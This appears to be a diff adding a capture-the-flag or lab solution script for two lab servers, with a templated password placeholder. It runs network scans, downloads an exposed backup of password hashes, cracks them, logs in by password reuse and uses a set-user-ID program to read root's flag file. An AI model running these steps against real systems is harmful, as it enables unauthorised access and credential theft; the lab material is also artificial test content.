@@ -1,0 +1,17 @@
+## find both servers
+nmap -sn 10.10.8.0/24
+nmap -sV 10.10.8.20
+nmap -sV 10.10.8.30
+## web01 has a forgotten backups folder with password hashes
+webscan http://10.10.8.20/
+curl -s http://10.10.8.20/backups/accounts.bak -o accounts.bak
+cat accounts.bak
+hashcrack accounts.bak
+## the renter password is reused on app02
+ssh -o StrictHostKeyChecking=accept-new renter@10.10.8.30
+{{OPPW}}
+cat flag.txt
+## a set-user-ID program reads files as root
+find / -perm -4000 -type f 2>/dev/null
+readlog /root/flag.txt
+exit
